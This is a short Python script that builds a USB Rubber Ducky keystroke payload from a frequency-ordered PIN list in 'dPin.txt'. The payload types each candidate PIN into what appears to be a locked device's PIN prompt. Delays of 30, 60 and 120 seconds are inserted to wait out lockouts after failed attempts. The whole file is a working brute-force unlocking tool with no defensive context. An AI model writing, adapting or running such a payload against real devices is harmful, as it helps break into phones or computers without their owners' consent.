thefile = open("dPin.txt","rt")
dpins = []
for line in thefile:
    dpin,sep,freq =line.partition(',')
    dpins.append(dpin+"\n")
thefile.close()
payload_f = open("payload.txt","w")
payload_f.write('DEFAULT_DELAY 40\nDELAY 1000\nENTER\nSPACE\nSPACE\n')
for x in range(5):
    payload_f.write('STRING '+dpins[x]+'ENTER\n'+ 'ENTER\n')
payload_f.write('DELAY 30000\nENTER\nSPACE\n')
for x in range(5,10):
    payload_f.write('STRING '+dpins[x]+'ENTER\n'+ 'ENTER\n')
for x in range(10,40):
    payload_f.write('DELAY 30000\nENTER\nSPACE\n'+'STRING '+dpins[x]+'ENTER\n'+ 'ENTER\n')
for x in range(40,50):
    payload_f.write('DELAY 60000\nENTER\nSPACE\n'+'STRING '+dpins[x]+'ENTER\n'+ 'ENTER\n')
for x in range(50,len(dpins)):
    payload_f.write('DELAY 120000\nENTER\nSPACE\n'+'STRING '+dpins[x]+'ENTER\n'+ 'ENTER\n')